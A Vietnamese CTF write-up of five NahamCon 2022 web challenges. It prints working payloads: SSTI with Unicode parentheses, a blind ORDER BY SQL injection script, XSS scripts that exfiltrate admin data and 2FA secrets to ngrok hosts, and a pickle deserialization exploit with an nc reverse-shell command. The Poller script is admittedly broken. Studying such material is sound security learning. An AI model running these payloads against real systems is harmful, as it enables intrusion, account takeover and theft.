# NahamCon CTF 2022
Một giải khá hay, sau đây là write up của 5 bài web

## Mục lục
[Deafcon](https://github.com/devme4f/ctf-writeup/tree/main/nahamcon#deafcon)
[Flaskmetal Alchemist](https://github.com/devme4f/ctf-writeup/tree/main/nahamcon#flaskmetal-alchemist)
[Hacker TS](https://github.com/devme4f/ctf-writeup/tree/main/nahamcon#hacker-ts)
[Poller](https://github.com/devme4f/ctf-writeup/tree/main/nahamcon#poller)
[Two For One](https://github.com/devme4f/ctf-writeup/tree/main/nahamcon#two-for-one)

## Deafcon

### Solution
Name: sam

Email: "{{request.application['__globals__'].__builtins__.__import__﹙'os'﹚.popen﹙'cat flag.txt'﹚.read﹙﹚}}"@m.edu

Here the symbols that look like ( and ) are actually high-unicode characters: SMALL LEFT/RIGHT PARENTHESIS 0xFE59 and 0xFE5A

These get past the filter but must "turn into" regular parenthesis when the expression is evaluated. I'm not sure why.

The email syntax checker allows certain characters ONLY if the portion to the left of the @ is surrounded by double-quotes.

### Note

#### Quick Review
1. App cho 2 phần user input là `name` và `email`, sau khi submit website trả về trang pdf chứa name và email vừa cung cấp.
2. Test param name thì bị filter chỉ white list regex `/a-zA-Z0-9/`
3. Param email có email parser ở backed, ví dụ như `a<img src="//a.com">@gmail.com` sẽ không đúng format và trả về lỗi không tuân thủ `RFC5322`. Ngoài ra nó filter ngoặc tròn '(' và ')'

#### Exploit
1. Để bypass email parser: `"a<we're good>"@a.com`, (phần username được bọc bằng dấu ngoặc kép bypass parser)
2. Thử tiếp: `"a{{7*'7'}}"@a.com` được `7777777` tức dính lỗi *SSTI*
3. Ta dùng unicode bypass filter '(' và ')' được payload sau:

```
Email: "{{request.application['__globals__'].__builtins__.__import__﹙'os'﹚.popen﹙'cat flag.txt'﹚.read﹙﹚}}"@a.com
```

**unicode**: https://www.fileformat.info/search/google.htm?q=PARENTHESIS&domains=www.fileformat.info&sitesearch=www.fileformat.info&client=pub-6975096118196151&forid=1&channel=1657057343&ie=UTF-8&oe=UTF-8&cof=GALT%3A%23008000%3BGL%3A1%3BDIV%3A%23336699%3BVLC%3A663399%3BAH%3Acenter%3BBGC%3AFFFFFF%3BLBGC%3A336699%3BALC%3A0000FF%3BLC%3A0000FF%3BT%3A000000%3BGFNT%3A0000FF%3BGIMP%3A0000FF%3BFORID%3A11&hl=en

## Flaskmetal Alchemist
SQL injection SQLAlchemy via text() function

### Description
Edward has decided to get into web development, and he built this awesome application that lets you search for any metal you want. Alphonse has some reservations though, so he wants you to check it out and make sure it's legit.

Source-code: `fma.zip`

### Solution

#### Review

![1](https://user-images.githubusercontent.com/71699412/167264396-56409af9-a175-439e-996a-28cc39964199.jpg)


Chall cho 1 website có thể tra cứu các nguyên tố hóa học cùng với thanh tìm kiếm, thanh này còn có thêm order by để sắp xếp kết quả trả về theo thứ tự như Name, Symbol hay Atomic Number.

Source-code: `app.py`
```python
from flask import Flask, render_template, request, url_for, redirect
from models import Metal
from database import db_session, init_db
from seed import seed_db
from sqlalchemy import text

app = Flask(__name__)


@app.teardown_appcontext
def shutdown_session(exception=None):
    db_session.remove()


@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        search = ""
        order = None
        if "search" in request.form:
            search = request.form["search"]
        if "order" in request.form:
            order = request.form["order"]
        if order is None:
            metals = Metal.query.filter(Metal.name.like("%{}%".format(search)))
        else:
            metals = Metal.query.filter(
                Metal.name.like("%{}%".format(search))
            ).order_by(text(order))
        return render_template("home.html", metals=metals)
    else:
        metals = Metal.query.all()
        return render_template("home.html", metals=metals)


if __name__ == "__main__":
    seed_db()
    app.run(debug=False)

```
Nhìn kĩ ta thấy điều bất thường là khi ta có sử dụng `order` param, query sẽ gồm method `.order_by()` pass hàm `text()` chứa param `order`. Qua tìm hiểu, hàm `text()` trong `sqlalchemy` là hàm thực hiện truy vấn nhận argument là 1 query string như các hệ SQL phổ biến khác thay vì cấu trúc như thường của nó là dùng `object-relational mapping(ORM)`, tức query bằng cách gọi các `object`, phù hợp cho lập trình hướng đối tượng.

Tham khảo: https://www.tutorialspoint.com/sqlalchemy/sqlalchemy_core_using_textual_sql.htm#:~:text=SQLAlchemy%20lets%20you%20just%20use,to%20the%20database%20mostly%20unchanged

Như bạn đã biết, exploit SQLi bằng `order by` này không thể tấn công bằng `union attack` nên ta nhận định đây là dạng SQL injection boolen based via order by.
#### Exploit

Ta tạo python script brute force thôi:

```python
import requests
import string

url = 'http://challenge.nahamcon.com:32714/'
characters = '_' + string.ascii_lowercase + string.digits + '}'

flag = 'flag{'
for i in range(30):
	for c in characters:
		data = {
			'search': '',
			'order': f'(SELECT CASE WHEN (select SUBSTR(flag,{len(flag)+1},1) from flag limit 1)="{c}" THEN "name" ELSE "atomic_number" END)'
		}

		r = requests.post(url, data=data)
		print('[-] - trying: ' + c)
		if '89' in r.text[2575:2544+137]:
			flag += c
			print('[+] - found: ' + flag)
			break

# name: Atomic Number: 89
# atomic_number: 3 
```

Ta ghép sql IF statement vào, thử điều kiện đúng sai trả về order by name/atomic_number, từ thứ tự khác biệt trả về, ta có thể brute force ra flag.

![Screenshot 2022-05-08 000216](https://user-images.githubusercontent.com/71699412/167264435-228c9758-0903-4ce7-be95-a1a4f842558e.jpg)

**Flag**: `flag{order_by_blind}`

## Hacker TS
Blind XSS make cross-site request forgery to localhost trộm sensitive information(flag)

### Description
We all love our hacker t-shirts. Make your own custom ones.

### Solution

#### Review

![7](https://user-images.githubusercontent.com/71699412/167263496-45a82ac5-4f98-4163-84f3-c743c93d5907.jpg)


- Chall cho nhập 1 đoạn text, gửi thì redirect đến page chứa ảnh áo kèm text vừa gửi.

- Truy cập đường dẫn admin thì nó chỉ cho localhost truy cập

#### Exploit

Ngồi test cả buổi cứ tưởng SSRF, Command Injection, RCE nhưng chẳng thèm thử XSS, và đúng thế, website dính lỗi XSS ở phía admin khi text ta gửi sẽ được 1 con bot go to để xem, đây là XSS blind, chơi CTF lần sau hãy chú ý nhiều hơn.

Ta gửi đoạn script sau, việc trỏ đến `a.js` giúp ta edit payload dễ hơn:
```html
<script src="http://a047-42-112-56-248.ngrok.io/a.js"></script>
```
file `a.js`:
```js
var xhr = new XMLHttpRequest;
xhr.open("GET", "http://localhost:5000/admin");
xhr.onload = function() {
	var flag = btoa(xhr.responseText);
	var exit = new XMLHttpRequest;
	exit.open("GET", "http://a047-42-112-56-248.ngrok.io?flag=" + flag);
	exit.send();
};

xhr.send();
```
Đơn giản là request `localhost/admin` rồi send responseText đến server mình host thôi, nhận được response: 

![Screenshot 2022-05-07 233532](https://user-images.githubusercontent.com/71699412/167263527-e2b079d7-7f05-46e5-9f10-54ece4583072.jpg)

Decode base64 ta được flag.

Hi admin! here is your flag: `flag{461e2452088eb397b6138a5934af6231}`

## Poller

### Solution

#### Review

![theme_poller](https://user-images.githubusercontent.com/71699412/167298257-bf1abc96-05fb-4437-a2b5-2a23dcc696b7.jpg)

Chall cho 1 website có các chứng năng đăng kí, đăng nhập. Sau khi login thì được redirect vào page để bình chọn poll, không có gì nhiều cho đến khi inspect source code ta tìm được đây là 1 open source code project trên github.

![client_src_code](https://user-images.githubusercontent.com/71699412/167298273-ad5042a5-bb9c-4840-b1a5-5d1b65f357ae.jpg)

https://github.com/congon4tor/poller


git clone về review source-code tìm vulnerablity, đây là python web app được build trên `django`, review 1 hồi thì không có tìm được cái gì là sai sai, cũng không thấy mặt mũi flag, có lẽ mục tiêu là RCE. Vào lại git repository tìm đến mục `History` xem có security issue nào được chỉnh sửa ở history không.
 
 ![history](https://user-images.githubusercontent.com/71699412/167298278-f3a78147-f331-40e3-a3e1-aa46de2c0720.jpg)

Ta tìm thấy lỗi sensitive data expose SECRET_KEY, với SECRET_KEY này ta có thể sign cookies và làm nhiều thứ khác....

![pickcle_src](https://user-images.githubusercontent.com/71699412/167298285-8b6c4cb9-787e-4347-94ff-c675c9912f14.jpg)

Ngoài ra app này dùng pickle để unserialize thẳng từ cookies, rõ ràng đây là lỗi object injection, một lỗi nghiêm trọng có thể dẫn đến RCE, read files,...

#### Exploit
Sau khi có SECRET_KEY ta thử tự serialize RCE payload nhưng fail, thử verify bằng SECRET_KEY với cookies của web app thì fail, rõ ràng đây không phải SECRET_KEY đúng, đừng láu táu.

Ta dùng đến tool `trufflehog`, 1 tool giúp scan các app phổ biến tìm senstive data expose như SECRET_KEY hay api key,...

src: https://github.com/trufflesecurity/trufflehog

Sau khi install, can git repository tìm sensitive data với command:
```bash
sudo docker run -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest git https://github.com/congon4tor/poller --debug --trace
```
Ta được results:

![secret_key_results](https://user-images.githubusercontent.com/71699412/167298292-933eefe3-2d96-43c1-9f67-20a69895aec4.jpg)

Ta tìm thấy được 1 SECRET_KEY khác với cái vừa tìm được:
```bash
SECRET_KEY=77m6p#v&(wk_s2+n5na-bqe!m)^zu)9typ#0c&@qd%8o6!
````

Thử dùng cái này verify cookies thì success, rõ ràng đây chính là SECRET_KEY của app và ta có thể dùng nó để tự sign cookies.

Như đã nói từ trước, cookies của app này là 1 serialized string object được serialize bằng python pickle module và được unserialize 1 cách insecure, ta sẽ tấn công object injection để đạt được RCE.

python scripts:
```python
import pickle
import os


class RCE:
    def __reduce__(self):
        # import os
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)


def verify(cookies, SECRET_KEY, salt):
    try: # mô phỏng thôi, cứ để nó dump error cho dễ debug
        results = loads(cookies, key=SECRET_KEY, serializer=PickleSerializer, salt=salt)
        return "Horray, it's a valid SECRET_KEY, decoded cookies: " + results
    except:
        return 'It\'s not a valid SECRET_KEY'

def sign(SECRET_KEY, salt);
    content['cookies'] = RCE()
    cookies = pickle.dumps(content, key=SECRET_KEY, serializer=PickleSerializer, salt=salt, compress=True)

    return cookies


SECRET_KEY = "77m6p#v&(wk_s2+n5na-bqe!m)^zu)9typ#0c&@qd%8o6!"
salt = "django.contrib.sessions.backends.signed_cookies" # default salt thôi
app_cookies = 'UNKNOWN'

if __name__ == '__main__':
    print(verify(app_cookies, SECRET_KEY, salt))
    print(sign(SECRET_KEY, salt))
    
# Code nhằm mục đích mô phỏng vì chall đã đóng, khá chắc là không chạy được, link solution: https://www.youtube.com/watch?v=9j74Wi6daEU
```
Mở tai lên(netcat) và nghe reverse shell dội về thôi!!

**Flag**: `pass`

## Two For One
Blind XSS make cross-site request forgery đánh cắp 2FA QR code sau đó reset password chiếm tài khoản admin

### Description
Need to keep things secure? Try out our safe, the most secure in the world!

### Solution

#### Review
- Chall truy cập vào redirect đến register page, thử đăng kí username là admin thì báo lỗi username đã tồn tại => Có lẽ mục đích là trộm cắp gì đó của admin.

- Việc login và register yêu cầu scan QR 2FA để lấy code mỗi lần truy cập

- Quét QR xong, vào có trang chứa secret, có page settings gồm các chức năng: Reset password, Reset2FA và Feedback.

+ Phần reset password chỉ cần nhập mật khẩu muốn đổi + 2FA code

+ Phần reset 2FA chỉ cần scan QR code để đổi mới, khi request QR mới, một request được gửi đi và response về đường link chứa QR tựa như: 

http://challenge.nahamcon.com:31169/reset2fa
```
{"url":"otpauth://totp/Fort%20Knox:2?secret=VOEJIF5EA7UDKTAS&issuer=Fort%20Knox"}
```

+ Phần feedback dính lỗi XSS từ phía admin, triger để test đơn giản: <scirpt src="http://e405-42-112-56-248.ngrok.io/evil.js"></scirpt>

![setting](https://user-images.githubusercontent.com/71699412/167260883-9d76f2d0-b2cd-4469-8037-2896aff45b28.jpg)

#### Exploit

**Ý tưởng**: Mục tiêu có lẽ là đánh cắp tài khoản admin để đọc được secret bằng cách lợi dụng XSS make request reset 2FA và nhận lại response trả về chứa QR code. Sau khi có QR code của admin, ta scan và lấy được 2FA code tiếp tục exploit XSS reset password với 2FA code của admin vừa có được. Reset password thành công, ta vào được tài khoản admin đọc secret.

**Step 1**: Đánh cắp QR code của admin qua XSS

Gửi feedback là: 
```html
<script src="http://e405-42-112-56-248.ngrok.io/evil_1.js"></script>
```
Link trên trỏ đến file js ta tự host để exploit XSS, file evil_1.js:

```js
var xhr = new XMLHttpRequest;
xhr.open("POST", "http://challenge.nahamcon.com:31169/reset2fa", true);
xhr.withCredentials = true;
xhr.onload = function() {
	var qr = btoa(xhr.responseText);
	var exit = new XMLHttpRequest;
	exit.open("GET", "http://e405-42-112-56-248.ngrok.io?qr=" + qr);
	exit.send();
};

xhr.send();
```

Từ link trả về, ta decode base64 được:
```json
{"url":"otpauth://totp/Fort%20Knox:admin?secret=L6EFVJEYQOQIZ4N7&issuer=Fort%20Knox"}
```

Ta dùng google `/chart` để generate QR code với secret trên: https://www.google.com/chart?chs=200x200&chld=MJ0&cht=qr&chl=otpauth://totp/Fort%20Knox:admin?secret=L6EFVJEYQOQIZ4N7&issuer=Fort%20Knox

**Step 2**: Với 2FA code, reset password của admin qua XSS

Gửi feedback là: 
```html
<script src="http://e405-42-112-56-248.ngrok.io/evil_2.js"></script>
```

file `evil_2.js`:
```js
var xhr = new XMLHttpRequest();
var url = "http://challenge.nahamcon.com:30299/reset_password";

xhr.open("POST", url, true);
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");

// debug
xhr.onload = function() {
	var status = btoa(xhr.responseText);
	var exit = new XMLHttpRequest;
	exit.open("GET", "http://e405-42-112-56-248.ngrok.io?status=" + status);
	exit.send();
};

// OTP vừa scan từ QR code của admin
xhr.send(JSON.stringify({"otp":"786746","password":"admin","password2":"admin"}));
```
GET /?status=eyJzdWNjZXNzIjp0cnVlfQo= ==> `{"success":true}`

![console](https://user-images.githubusercontent.com/71699412/167260871-c93f5cc3-9bf9-478b-9ff4-fc085499db91.jpg)

Login as admin với admin:admin

**flag**: `flag{96710ea6be916326f96de003c1cc97cb}`
